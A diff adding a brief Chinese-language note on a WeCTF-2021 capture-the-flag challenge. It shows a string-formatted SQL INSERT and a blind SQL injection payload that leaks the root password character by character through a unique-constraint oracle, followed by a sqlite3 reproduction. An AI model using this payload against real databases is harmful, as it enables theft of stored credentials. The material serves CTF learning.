@@ -1,0 +1,25 @@
+https://github.com/justmark0/ctf_writeups/blob/master/WeCTF-2021/Phish.md
+
+漏洞:
+INSERT INTO users (password, username) VALUES ('{password}', '{username}')
+
+解法:                                                                              位置 長度
+password="a',  CASE WHEN substr((SELECT password FROM users WHERE username='root'),   1,   1) = 's' THEN 'root' ELSE 'abc' END);--"
+
+說明:
+如果 root 的 password 第 1 個字元為 s 則註冊失敗 (username: root 已經存在, 否則註冊成功 (當然, bruteforce 時 'abc' 要不斷更動, 避免重複) 
+
+
+
+
+實際測試
+$ sqlite3
+create table users (
+    username TEXT type UNIQUE,
+    password TEXT
+);
+
+insert into users (password, username) values ('secret', 'root');
+insert into users (password, username) values ('a', CASE WHEN substr((SELECT password FROM users WHERE username='root'),1, 1) = 's' THEN "root" ELSE 'a' END);
+
+
